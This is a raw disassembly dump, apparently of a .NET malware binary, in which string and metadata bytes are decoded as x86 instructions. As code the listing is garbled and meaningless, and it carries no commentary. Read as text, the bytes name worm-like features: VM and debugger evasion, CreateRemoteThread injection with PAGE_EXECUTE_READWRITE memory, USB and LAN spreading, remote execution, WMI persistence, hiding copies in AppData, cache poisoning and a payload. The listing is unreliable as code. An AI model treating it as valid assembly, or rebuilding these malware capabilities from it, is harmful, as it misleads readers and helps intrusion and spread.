  4076bd:	44                   	inc    %esp
  4076be:	33 31                	xor    (%ecx),%esi
  4076c0:	42                   	inc    %edx
  4076c1:	45                   	inc    %ebp
  4076c2:	37                   	aaa
  4076c3:	41                   	inc    %ecx
  4076c4:	44                   	inc    %esp
  4076c5:	31 30                	xor    %esi,(%eax)
  4076c7:	35 45 41 36 34       	xor    $0x34364145,%eax
  4076cc:	41                   	inc    %ecx
  4076cd:	36 45                	ss inc %ebp
  4076cf:	36 38 36             	cmp    %dh,%ss:(%esi)
  4076d2:	43                   	inc    %ebx
  4076d3:	43                   	inc    %ebx
  4076d4:	30 38                	xor    %bh,(%eax)
  4076d6:	42                   	inc    %edx
  4076d7:	35 36 39 00 3c       	xor    $0x3c003936,%eax
  4076dc:	3e 39 00             	cmp    %eax,%ds:(%eax)
  4076df:	3c 4d                	cmp    $0x4d,%al
  4076e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4076e2:	64 75 6c             	fs jne 0x407751
  4076e5:	65 3e 00 3c 50       	gs add %bh,%ds:(%eax,%edx,2)
  4076ea:	72 69                	jb     0x407755
  4076ec:	76 61                	jbe    0x40774f
  4076ee:	74 65                	je     0x407755
  4076f0:	49                   	dec    %ecx
  4076f1:	6d                   	insl   (%dx),%es:(%edi)
  4076f2:	70 6c                	jo     0x407760
  4076f4:	65 6d                	gs insl (%dx),%es:(%edi)
  4076f6:	65 6e                	outsb  %gs:(%esi),(%dx)
  4076f8:	74 61                	je     0x40775b
  4076fa:	74 69                	je     0x407765
  4076fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4076fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4076fe:	44                   	inc    %esp
  4076ff:	65 74 61             	gs je  0x407763
  407702:	69 6c 73 3e 00 52 43 	imul   $0x45435200,0x3e(%ebx,%esi,2),%ebp
  407709:	45 
  40770a:	00 50 41             	add    %dl,0x41(%eax)
  40770d:	47                   	inc    %edi
  40770e:	45                   	inc    %ebp
  40770f:	5f                   	pop    %edi
  407710:	45                   	inc    %ebp
  407711:	58                   	pop    %eax
  407712:	45                   	inc    %ebp
  407713:	43                   	inc    %ebx
  407714:	55                   	push   %ebp
  407715:	54                   	push   %esp
  407716:	45                   	inc    %ebp
  407717:	5f                   	pop    %edi
  407718:	52                   	push   %edx
  407719:	45                   	inc    %ebp
  40771a:	41                   	inc    %ecx
  40771b:	44                   	inc    %esp
  40771c:	57                   	push   %edi
  40771d:	52                   	push   %edx
  40771e:	49                   	dec    %ecx
  40771f:	54                   	push   %esp
  407720:	45                   	inc    %ebp
  407721:	00 4d 45             	add    %cl,0x45(%ebp)
  407724:	4d                   	dec    %ebp
  407725:	5f                   	pop    %edi
  407726:	52                   	push   %edx
  407727:	45                   	inc    %ebp
  407728:	53                   	push   %ebx
  407729:	45                   	inc    %ebp
  40772a:	52                   	push   %edx
  40772b:	56                   	push   %esi
  40772c:	45                   	inc    %ebp
  40772d:	00 32                	add    %dh,(%edx)
  40772f:	35 31 34 34 37       	xor    $0x37343431,%eax
  407734:	45                   	inc    %ebp
  407735:	45                   	inc    %ebp
  407736:	39 31                	cmp    %esi,(%ecx)
  407738:	41                   	inc    %ecx
  407739:	39 30                	cmp    %esi,(%eax)
  40773b:	36 37                	ss aaa
  40773d:	44                   	inc    %esp
  40773e:	43                   	inc    %ebx
  40773f:	44                   	inc    %esp
  407740:	36 41                	ss inc %ecx
  407742:	42                   	inc    %edx
  407743:	39 36                	cmp    %esi,(%esi)
  407745:	37                   	aaa
  407746:	30 33                	xor    %dh,(%ebx)
  407748:	31 33                	xor    %esi,(%ebx)
  40774a:	33 46 36             	xor    0x36(%esi),%eax
  40774d:	31 37                	xor    %esi,(%edi)
  40774f:	35 36 35 39 37       	xor    $0x37393536,%eax
  407754:	34 43                	xor    $0x43,%al
  407756:	44                   	inc    %esp
  407757:	36 43                	ss inc %ebx
  407759:	34 38                	xor    $0x38,%al
  40775b:	31 39                	xor    %edi,(%ecx)
  40775d:	30 32                	xor    %dh,(%edx)
  40775f:	31 37                	xor    %esi,(%edi)
  407761:	36 30 43 34          	xor    %al,%ss:0x34(%ebx)
  407765:	36 38 38             	cmp    %bh,%ss:(%eax)
  407768:	43                   	inc    %ebx
  407769:	39 31                	cmp    %esi,(%ecx)
  40776b:	41                   	inc    %ecx
  40776c:	42                   	inc    %edx
  40776d:	46                   	inc    %esi
  40776e:	00 49 73             	add    %cl,0x73(%ecx)
  407771:	52                   	push   %edx
  407772:	75 6e                	jne    0x4077e2
  407774:	6e                   	outsb  %ds:(%esi),(%dx)
  407775:	69 6e 67 49 6e 56 4d 	imul   $0x4d566e49,0x67(%esi),%ebp
  40777c:	00 49 73             	add    %cl,0x73(%ecx)
  40777f:	44                   	inc    %esp
  407780:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407784:	67 65 64 4f          	addr16 gs fs dec %edi
  407788:	72 56                	jb     0x4077e0
  40778a:	4d                   	dec    %ebp
  40778b:	00 53 79             	add    %dl,0x79(%ebx)
  40778e:	73 74                	jae    0x407804
  407790:	65 6d                	gs insl (%dx),%es:(%edi)
  407792:	2e 49                	cs dec %ecx
  407794:	4f                   	dec    %edi
  407795:	00 50 52             	add    %dl,0x52(%eax)
  407798:	4f                   	dec    %edi
  407799:	43                   	inc    %ebx
  40779a:	45                   	inc    %ebp
  40779b:	53                   	push   %ebx
  40779c:	53                   	push   %ebx
  40779d:	5f                   	pop    %edi
  40779e:	41                   	inc    %ecx
  40779f:	4c                   	dec    %esp
  4077a0:	4c                   	dec    %esp
  4077a1:	5f                   	pop    %edi
  4077a2:	41                   	inc    %ecx
  4077a3:	43                   	inc    %ebx
  4077a4:	43                   	inc    %ebx
  4077a5:	45                   	inc    %ebp
  4077a6:	53                   	push   %ebx
  4077a7:	53                   	push   %ebx
  4077a8:	00 53 54             	add    %dl,0x54(%ebx)
  4077ab:	41                   	inc    %ecx
  4077ac:	54                   	push   %esp
  4077ad:	55                   	push   %ebp
  4077ae:	53                   	push   %ebx
  4077af:	5f                   	pop    %edi
  4077b0:	53                   	push   %ebx
  4077b1:	55                   	push   %ebp
  4077b2:	43                   	inc    %ebx
  4077b3:	43                   	inc    %ebx
  4077b4:	45                   	inc    %ebp
  4077b5:	53                   	push   %ebx
  4077b6:	53                   	push   %ebx
  4077b7:	00 4d 45             	add    %cl,0x45(%ebp)
  4077ba:	4d                   	dec    %ebp
  4077bb:	5f                   	pop    %edi
  4077bc:	43                   	inc    %ebx
  4077bd:	4f                   	dec    %edi
  4077be:	4d                   	dec    %ebp
  4077bf:	4d                   	dec    %ebp
  4077c0:	49                   	dec    %ecx
  4077c1:	54                   	push   %esp
  4077c2:	00 62 4e             	add    %ah,0x4e(%edx)
  4077c5:	65 65 64 53          	gs gs fs push %ebx
  4077c9:	63 62 00             	arpl   %esp,0x0(%edx)
  4077cc:	6d                   	insl   (%dx),%es:(%edi)
  4077cd:	73 63                	jae    0x407832
  4077cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4077d0:	72 6c                	jb     0x40783e
  4077d2:	69 62 00 3c 3e 63 00 	imul   $0x633e3c,0x0(%edx),%esp
  4077d9:	6d                   	insl   (%dx),%es:(%edi)
  4077da:	61                   	popa
  4077db:	63 00                	arpl   %eax,(%eax)
  4077dd:	53                   	push   %ebx
  4077de:	79 73                	jns    0x407853
  4077e0:	74 65                	je     0x407847
  4077e2:	6d                   	insl   (%dx),%es:(%edi)
  4077e3:	2e 43                	cs inc %ebx
  4077e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4077e6:	6c                   	insb   (%dx),%es:(%edi)
  4077e7:	6c                   	insb   (%dx),%es:(%edi)
  4077e8:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4077ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4077ee:	73 2e                	jae    0x40781e
  4077f0:	47                   	inc    %edi
  4077f1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4077f3:	65 72 69             	gs jb  0x40785f
  4077f6:	63 00                	arpl   %eax,(%eax)
  4077f8:	53                   	push   %ebx
  4077f9:	70 72                	jo     0x40786d
  4077fb:	65 61                	gs popa
  4077fd:	64 41                	fs inc %ecx
  4077ff:	73 79                	jae    0x40787a
  407801:	6e                   	outsb  %ds:(%esi),(%dx)
  407802:	63 00                	arpl   %eax,(%eax)
  407804:	53                   	push   %ebx
  407805:	70 72                	jo     0x407879
  407807:	65 61                	gs popa
  407809:	64 4f                	fs dec %edi
  40780b:	6e                   	outsb  %ds:(%esi),(%dx)
  40780c:	63 65 41             	arpl   %esp,0x41(%ebp)
  40780f:	73 79                	jae    0x40788a
  407811:	6e                   	outsb  %ds:(%esi),(%dx)
  407812:	63 00                	arpl   %eax,(%eax)
  407814:	4f                   	dec    %edi
  407815:	70 65                	jo     0x40787c
  407817:	6e                   	outsb  %ds:(%esi),(%dx)
  407818:	46                   	inc    %esi
  407819:	61                   	popa
  40781a:	6b 65 43 6f          	imul   $0x6f,0x43(%ebp),%esp
  40781e:	6e                   	outsb  %ds:(%esi),(%dx)
  40781f:	6e                   	outsb  %ds:(%esi),(%dx)
  407820:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407825:	6e                   	outsb  %ds:(%esi),(%dx)
  407826:	41                   	inc    %ecx
  407827:	73 79                	jae    0x4078a2
  407829:	6e                   	outsb  %ds:(%esi),(%dx)
  40782a:	63 00                	arpl   %eax,(%eax)
  40782c:	54                   	push   %esp
  40782d:	72 79                	jb     0x4078a8
  40782f:	53                   	push   %ebx
  407830:	63 68 65             	arpl   %ebp,0x65(%eax)
  407833:	64 75 6c             	fs jne 0x4078a2
  407836:	65 52                	gs push %edx
  407838:	65 6d                	gs insl (%dx),%es:(%edi)
  40783a:	6f                   	outsl  %ds:(%esi),(%dx)
  40783b:	74 65                	je     0x4078a2
  40783d:	45                   	inc    %ebp
  40783e:	78 65                	js     0x4078a5
  407840:	63 75 74             	arpl   %esi,0x74(%ebp)
  407843:	69 6f 6e 41 73 79 6e 	imul   $0x6e797341,0x6e(%edi),%ebp
  40784a:	63 00                	arpl   %eax,(%eax)
  40784c:	43                   	inc    %ebx
  40784d:	6f                   	outsl  %ds:(%esi),(%dx)
  40784e:	6e                   	outsb  %ds:(%esi),(%dx)
  40784f:	6e                   	outsb  %ds:(%esi),(%dx)
  407850:	65 63 74 41 73       	arpl   %esi,%gs:0x73(%ecx,%eax,2)
  407855:	79 6e                	jns    0x4078c5
  407857:	63 00                	arpl   %eax,(%eax)
  407859:	57                   	push   %edi
  40785a:	61                   	popa
  40785b:	69 74 41 73 79 6e 63 	imul   $0x636e79,0x73(%ecx,%eax,2),%esi
  407862:	00 
  407863:	73 76                	jae    0x4078db
  407865:	63 00                	arpl   %eax,(%eax)
  407867:	3c 3c                	cmp    $0x3c,%al
  407869:	53                   	push   %ebx
  40786a:	74 61                	je     0x4078cd
  40786c:	72 74                	jb     0x4078e2
  40786e:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  407872:	33 5f 30             	xor    0x30(%edi),%ebx
  407875:	3e 64 00 3c 3c       	ds add %bh,%fs:(%esp,%edi,1)
  40787a:	53                   	push   %ebx
  40787b:	74 61                	je     0x4078de
  40787d:	72 74                	jb     0x4078f3
  40787f:	53                   	push   %ebx
  407880:	70 72                	jo     0x4078f4
  407882:	65 61                	gs popa
  407884:	64 69 6e 67 3e 62 5f 	imul   $0x5f5f623e,%fs:0x67(%esi),%ebp
  40788b:	5f 
  40788c:	34 5f                	xor    $0x5f,%al
  40788e:	30 3e                	xor    %bh,(%esi)
  407890:	64 00 3c 3c          	add    %bh,%fs:(%esp,%edi,1)
  407894:	53                   	push   %ebx
  407895:	70 72                	jo     0x407909
  407897:	65 61                	gs popa
  407899:	64 41                	fs inc %ecx
  40789b:	73 79                	jae    0x407916
  40789d:	6e                   	outsb  %ds:(%esi),(%dx)
  40789e:	63 3e                	arpl   %edi,(%esi)
  4078a0:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  4078a3:	31 3e                	xor    %edi,(%esi)
  4078a5:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  4078a9:	74 5f                	je     0x40790a
  4078ab:	49                   	dec    %ecx
  4078ac:	64 00 6c 70 54       	add    %ch,%fs:0x54(%eax,%esi,2)
  4078b1:	68 72 65 61 64       	push   $0x64616572
  4078b6:	49                   	dec    %ecx
  4078b7:	64 00 70 72          	add    %dh,%fs:0x72(%eax)
  4078bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4078bc:	63 65 73             	arpl   %esp,0x73(%ebp)
  4078bf:	73 49                	jae    0x40790a
  4078c1:	64 00 43 72          	add    %al,%fs:0x72(%ebx)
  4078c5:	65 61                	gs popa
  4078c7:	74 65                	je     0x40792e
  4078c9:	52                   	push   %edx
  4078ca:	65 6d                	gs insl (%dx),%es:(%edi)
  4078cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4078cd:	74 65                	je     0x407934
  4078cf:	54                   	push   %esp
  4078d0:	68 72 65 61 64       	push   $0x64616572
  4078d5:	00 55 73             	add    %dl,0x73(%ebp)
  4078d8:	62 53 70             	bound  %edx,0x70(%ebx)
  4078db:	72 65                	jb     0x407942
  4078dd:	61                   	popa
  4078de:	64 00 4c 61 6e       	add    %cl,%fs:0x6e(%ecx,%eiz,2)
  4078e3:	53                   	push   %ebx
  4078e4:	70 72                	jo     0x407958
  4078e6:	65 61                	gs popa
  4078e8:	64 00 43 70          	add    %al,%fs:0x70(%ebx)
  4078ec:	75 6c                	jne    0x40795a
  4078ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4078ef:	61                   	popa
  4078f0:	64 00 70 61          	add    %dh,%fs:0x61(%eax)
  4078f4:	79 6c                	jns    0x407962
  4078f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4078f7:	61                   	popa
  4078f8:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  4078fc:	64 00 43 6f          	add    %al,%fs:0x6f(%ebx)
  407900:	70 79                	jo     0x40797b
  407902:	54                   	push   %esp
  407903:	6f                   	outsl  %ds:(%esi),(%dx)
  407904:	41                   	inc    %ecx
  407905:	70 70                	jo     0x407977
  407907:	44                   	inc    %esp
  407908:	61                   	popa
  407909:	74 61                	je     0x40796c
  40790b:	49                   	dec    %ecx
  40790c:	66 4e                	dec    %si
  40790e:	65 65 64 65 64 00 49 	gs gs fs gs add %cl,%fs:0x73(%ecx)
  407915:	73 
  407916:	44                   	inc    %esp
  407917:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40791b:	67 65 72 41          	addr16 gs jb 0x407960
  40791f:	74 74                	je     0x407995
  407921:	61                   	popa
  407922:	63 68 65             	arpl   %ebp,0x65(%eax)
  407925:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  407929:	74 5f                	je     0x40798a
  40792b:	49                   	dec    %ecx
  40792c:	73 41                	jae    0x40796f
  40792e:	74 74                	je     0x4079a4
  407930:	61                   	popa
  407931:	63 68 65             	arpl   %ebp,0x65(%eax)
  407934:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  407938:	74 5f                	je     0x407999
  40793a:	43                   	inc    %ebx
  40793b:	6f                   	outsl  %ds:(%esi),(%dx)
  40793c:	6e                   	outsb  %ds:(%esi),(%dx)
  40793d:	6e                   	outsb  %ds:(%esi),(%dx)
  40793e:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407943:	00 67 65             	add    %ah,0x65(%edi)
  407946:	74 5f                	je     0x4079a7
  407948:	49                   	dec    %ecx
  407949:	73 43                	jae    0x40798e
  40794b:	6f                   	outsl  %ds:(%esi),(%dx)
  40794c:	6e                   	outsb  %ds:(%esi),(%dx)
  40794d:	6e                   	outsb  %ds:(%esi),(%dx)
  40794e:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407953:	00 41 77             	add    %al,0x77(%ecx)
  407956:	61                   	popa
  407957:	69 74 55 6e 73 61 66 	imul   $0x65666173,0x6e(%ebp,%edx,2),%esi
  40795e:	65 
  40795f:	4f                   	dec    %edi
  407960:	6e                   	outsb  %ds:(%esi),(%dx)
  407961:	43                   	inc    %ebx
  407962:	6f                   	outsl  %ds:(%esi),(%dx)
  407963:	6d                   	insl   (%dx),%es:(%edi)
  407964:	70 6c                	jo     0x4079d2
  407966:	65 74 65             	gs je  0x4079ce
  407969:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  40796d:	74 5f                	je     0x4079ce
  40796f:	49                   	dec    %ecx
  407970:	73 43                	jae    0x4079b5
  407972:	6f                   	outsl  %ds:(%esi),(%dx)
  407973:	6d                   	insl   (%dx),%es:(%edi)
  407974:	70 6c                	jo     0x4079e2
  407976:	65 74 65             	gs je  0x4079de
  407979:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  40797d:	74 5f                	je     0x4079de
  40797f:	49                   	dec    %ecx
  407980:	73 43                	jae    0x4079c5
  407982:	61                   	popa
  407983:	6e                   	outsb  %ds:(%esi),(%dx)
  407984:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  407987:	6c                   	insb   (%dx),%es:(%edi)
  407988:	61                   	popa
  407989:	74 69                	je     0x4079f4
  40798b:	6f                   	outsl  %ds:(%esi),(%dx)
  40798c:	6e                   	outsb  %ds:(%esi),(%dx)
  40798d:	52                   	push   %edx
  40798e:	65 71 75             	gs jno 0x407a06
  407991:	65 73 74             	gs jae 0x407a08
  407994:	65 64 00 62 52       	gs add %ah,%fs:0x52(%edx)
  407999:	65 73 65             	gs jae 0x407a01
  40799c:	72 76                	jb     0x407a14
  40799e:	65 64 00 53 79       	gs add %dl,%fs:0x79(%ebx)
  4079a3:	73 74                	jae    0x407a19
  4079a5:	65 6d                	gs insl (%dx),%es:(%edi)
  4079a7:	2e 43                	cs inc %ebx
  4079a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4079aa:	6c                   	insb   (%dx),%es:(%edi)
  4079ab:	6c                   	insb   (%dx),%es:(%edi)
  4079ac:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4079b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4079b2:	73 2e                	jae    0x4079e2
  4079b4:	53                   	push   %ebx
  4079b5:	70 65                	jo     0x407a1c
  4079b7:	63 69 61             	arpl   %ebp,0x61(%ecx)
  4079ba:	6c                   	insb   (%dx),%es:(%edi)
  4079bb:	69 7a 65 64 00 4e 65 	imul   $0x654e0064,0x65(%edx),%edi
  4079c2:	77 47                	ja     0x407a0b
  4079c4:	75 69                	jne    0x407a2f
  4079c6:	64 00 54 72 69       	add    %dl,%fs:0x69(%edx,%esi,2)
  4079cb:	6d                   	insl   (%dx),%es:(%edi)
  4079cc:	45                   	inc    %ebp
  4079cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4079ce:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  4079d2:	61                   	popa
  4079d3:	64 54                	fs push %esp
  4079d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4079d6:	45                   	inc    %ebp
  4079d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4079d8:	64 00 45 78          	add    %al,%fs:0x78(%ebp)
  4079dc:	65 63 75 74          	arpl   %esi,%gs:0x74(%ebp)
  4079e0:	65 43                	gs inc %ebx
  4079e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4079e3:	6d                   	insl   (%dx),%es:(%edi)
  4079e4:	6d                   	insl   (%dx),%es:(%edi)
  4079e5:	61                   	popa
  4079e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4079e7:	64 00 63 6f          	add    %ah,%fs:0x6f(%ebx)
  4079eb:	6d                   	insl   (%dx),%es:(%edi)
  4079ec:	6d                   	insl   (%dx),%es:(%edi)
  4079ed:	61                   	popa
  4079ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4079ef:	64 00 53 65          	add    %dl,%fs:0x65(%ebx)
  4079f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4079f4:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  4079f8:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  4079ff:	61 
  407a00:	6c                   	insb   (%dx),%es:(%edi)
  407a01:	75 65                	jne    0x407a68
  407a03:	4b                   	dec    %ebx
  407a04:	69 6e 64 00 72 6e 64 	imul   $0x646e7200,0x64(%esi),%ebp
  407a0b:	00 73 65             	add    %dh,0x65(%ebx)
  407a0e:	74 5f                	je     0x407a6f
  407a10:	49                   	dec    %ecx
  407a11:	73 42                	jae    0x407a55
  407a13:	61                   	popa
  407a14:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407a17:	72 6f                	jb     0x407a88
  407a19:	75 6e                	jne    0x407a89
  407a1b:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  407a1f:	76 6f                	jbe    0x407a90
  407a21:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  407a25:	74 68                	je     0x407a8f
  407a27:	6f                   	outsl  %ds:(%esi),(%dx)
  407a28:	64 00 44 69 73       	add    %al,%fs:0x73(%ecx,%ebp,2)
  407a2d:	63 6f 72             	arpl   %ebp,0x72(%edi)
  407a30:	64 00 73 65          	add    %dh,%fs:0x65(%ebx)
  407a34:	74 5f                	je     0x407a95
  407a36:	50                   	push   %eax
  407a37:	61                   	popa
  407a38:	73 73                	jae    0x407aad
  407a3a:	77 6f                	ja     0x407aab
  407a3c:	72 64                	jb     0x407aa2
  407a3e:	00 4e 65             	add    %cl,0x65(%esi)
  407a41:	74 77                	je     0x407aba
  407a43:	6f                   	outsl  %ds:(%esi),(%dx)
  407a44:	72 6b                	jb     0x407ab1
  407a46:	49                   	dec    %ecx
  407a47:	6e                   	outsb  %ds:(%esi),(%dx)
  407a48:	74 65                	je     0x407aaf
  407a4a:	72 66                	jb     0x407ab2
  407a4c:	61                   	popa
  407a4d:	63 65 00             	arpl   %esp,0x0(%ebp)
  407a50:	52                   	push   %edx
  407a51:	65 70 6c             	gs jo  0x407ac0
  407a54:	61                   	popa
  407a55:	63 65 00             	arpl   %esp,0x0(%ebp)
  407a58:	49                   	dec    %ecx
  407a59:	73 4e                	jae    0x407aa9
  407a5b:	75 6c                	jne    0x407ac9
  407a5d:	6c                   	insb   (%dx),%es:(%edi)
  407a5e:	4f                   	dec    %edi
  407a5f:	72 57                	jb     0x407ab8
  407a61:	68 69 74 65 53       	push   $0x53657469
  407a66:	70 61                	jo     0x407ac9
  407a68:	63 65 00             	arpl   %esp,0x0(%ebp)
  407a6b:	43                   	inc    %ebx
  407a6c:	72 65                	jb     0x407ad3
  407a6e:	61                   	popa
  407a6f:	74 65                	je     0x407ad6
  407a71:	49                   	dec    %ecx
  407a72:	6e                   	outsb  %ds:(%esi),(%dx)
  407a73:	73 74                	jae    0x407ae9
  407a75:	61                   	popa
  407a76:	6e                   	outsb  %ds:(%esi),(%dx)
  407a77:	63 65 00             	arpl   %esp,0x0(%ebp)
  407a7a:	57                   	push   %edi
  407a7b:	4d                   	dec    %ebp
  407a7c:	49                   	dec    %ecx
  407a7d:	50                   	push   %eax
  407a7e:	65 72 73             	gs jb  0x407af4
  407a81:	69 73 74 65 6e 63 65 	imul   $0x65636e65,0x74(%ebx),%esi
  407a88:	00 43 61             	add    %al,0x61(%ebx)
  407a8b:	6e                   	outsb  %ds:(%esi),(%dx)
  407a8c:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  407a8f:	6c                   	insb   (%dx),%es:(%edi)
  407a90:	61                   	popa
  407a91:	74 69                	je     0x407afc
  407a93:	6f                   	outsl  %ds:(%esi),(%dx)
  407a94:	6e                   	outsb  %ds:(%esi),(%dx)
  407a95:	54                   	push   %esp
  407a96:	6f                   	outsl  %ds:(%esi),(%dx)
  407a97:	6b 65 6e 53          	imul   $0x53,0x6e(%ebp),%esp
  407a9b:	6f                   	outsl  %ds:(%esi),(%dx)
  407a9c:	75 72                	jne    0x407b10
  407a9e:	63 65 00             	arpl   %esp,0x0(%ebp)
  407aa1:	73 6f                	jae    0x407b12
  407aa3:	75 72                	jne    0x407b17
  407aa5:	63 65 00             	arpl   %esp,0x0(%ebp)
  407aa8:	43                   	inc    %ebx
  407aa9:	6f                   	outsl  %ds:(%esi),(%dx)
  407aaa:	70 79                	jo     0x407b25
  407aac:	41                   	inc    %ecx
  407aad:	6e                   	outsb  %ds:(%esi),(%dx)
  407aae:	64 48                	fs dec %eax
  407ab0:	69 64 65 00 44 65 6c 	imul   $0x656c6544,0x0(%ebp,%eiz,2),%esp
  407ab7:	65 
  407ab8:	74 65                	je     0x407b1f
  407aba:	53                   	push   %ebx
  407abb:	75 62                	jne    0x407b1f
  407abd:	4b                   	dec    %ebx
  407abe:	65 79 54             	gs jns 0x407b15
  407ac1:	72 65                	jb     0x407b28
  407ac3:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407ac7:	74 5f                	je     0x407b28
  407ac9:	4d                   	dec    %ebp
  407aca:	65 73 73             	gs jae 0x407b40
  407acd:	61                   	popa
  407ace:	67 65 00 6d 65       	add    %ch,%gs:0x65(%di)
  407ad3:	73 73                	jae    0x407b48
  407ad5:	61                   	popa
  407ad6:	67 65 00 52 61       	add    %dl,%gs:0x61(%bp,%si)
  407adb:	6e                   	outsb  %ds:(%esi),(%dx)
  407adc:	67 65 00 50 6f       	add    %dl,%gs:0x6f(%bx,%si)
  407ae1:	69 73 6f 6e 43 61 63 	imul   $0x6361436e,0x6f(%ebx),%esi
  407ae8:	68 65 00 45 6e       	push   $0x6e450065
  407aed:	75 6d                	jne    0x407b5c
  407aef:	65 72 61             	gs jb  0x407b53
  407af2:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  407af6:	49                   	dec    %ecx
  407af7:	73 56                	jae    0x407b4f
  407af9:	75 6c                	jne    0x407b67
  407afb:	6e                   	outsb  %ds:(%esi),(%dx)
  407afc:	65 72 61             	gs jb  0x407b60
  407aff:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  407b03:	49                   	dec    %ecx
  407b04:	44                   	inc    %esp
  407b05:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  407b0c:	6c                   	insb   (%dx),%es:(%edi)
  407b0d:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  407b11:	69 74 46 6f 72 49 6e 	imul   $0x706e4972,0x6f(%esi,%eax,2),%esi
  407b18:	70 
  407b19:	75 74                	jne    0x407b8f
  407b1b:	49                   	dec    %ecx
  407b1c:	64 6c                	fs insb (%dx),%es:(%edi)
  407b1e:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407b22:	6e                   	outsb  %ds:(%esi),(%dx)
  407b23:	74 69                	je     0x407b8e
  407b25:	6d                   	insl   (%dx),%es:(%edi)
  407b26:	65 46                	gs inc %esi
  407b28:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  407b2f:	64 6c                	fs insb (%dx),%es:(%edi)
  407b31:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407b35:	74 4d                	je     0x407b84
  407b37:	6f                   	outsl  %ds:(%esi),(%dx)
  407b38:	64 75 6c             	fs jne 0x407ba7
  407b3b:	65 48                	gs dec %eax
  407b3d:	61                   	popa
  407b3e:	6e                   	outsb  %ds:(%esi),(%dx)
  407b3f:	64 6c                	fs insb (%dx),%es:(%edi)
  407b41:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  407b45:	6f                   	outsl  %ds:(%esi),(%dx)
  407b46:	73 65                	jae    0x407bad
  407b48:	48                   	dec    %eax
  407b49:	61                   	popa
  407b4a:	6e                   	outsb  %ds:(%esi),(%dx)
  407b4b:	64 6c                	fs insb (%dx),%es:(%edi)
  407b4d:	65 00 62 49          	add    %ah,%gs:0x49(%edx)
  407b51:	6e                   	outsb  %ds:(%esi),(%dx)
  407b52:	68 65 72 69 74       	push   $0x74697265
  407b57:	48                   	dec    %eax
  407b58:	61                   	popa
  407b59:	6e                   	outsb  %ds:(%esi),(%dx)
  407b5a:	64 6c                	fs insb (%dx),%es:(%edi)
  407b5c:	65 00 64 65 73       	add    %ah,%gs:0x73(%ebp,%eiz,2)
  407b61:	74 46                	je     0x407ba9
  407b63:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  407b6a:	6e 
  407b6b:	52                   	push   %edx
  407b6c:	6f                   	outsl  %ds:(%esi),(%dx)
  407b6d:	6c                   	insb   (%dx),%es:(%edi)
  407b6e:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  407b72:	6e                   	outsb  %ds:(%esi),(%dx)
  407b73:	64 6f                	outsl  %fs:(%esi),(%dx)
  407b75:	77 73                	ja     0x407bea
  407b77:	42                   	inc    %edx
  407b78:	75 69                	jne    0x407be3
  407b7a:	6c                   	insb   (%dx),%es:(%edi)
  407b7b:	74 49                	je     0x407bc6
  407b7d:	6e                   	outsb  %ds:(%esi),(%dx)
  407b7e:	52                   	push   %edx
  407b7f:	6f                   	outsl  %ds:(%esi),(%dx)
  407b80:	6c                   	insb   (%dx),%es:(%edi)
  407b81:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  407b85:	6e                   	outsb  %ds:(%esi),(%dx)
  407b86:	73 6f                	jae    0x407bf7
  407b88:	6c                   	insb   (%dx),%es:(%edi)
  407b89:	65 00 68 4d          	add    %ch,%gs:0x4d(%eax)
  407b8d:	6f                   	outsl  %ds:(%esi),(%dx)
  407b8e:	64 75 6c             	fs jne 0x407bfd
  407b91:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407b95:	74 5f                	je     0x407bf6
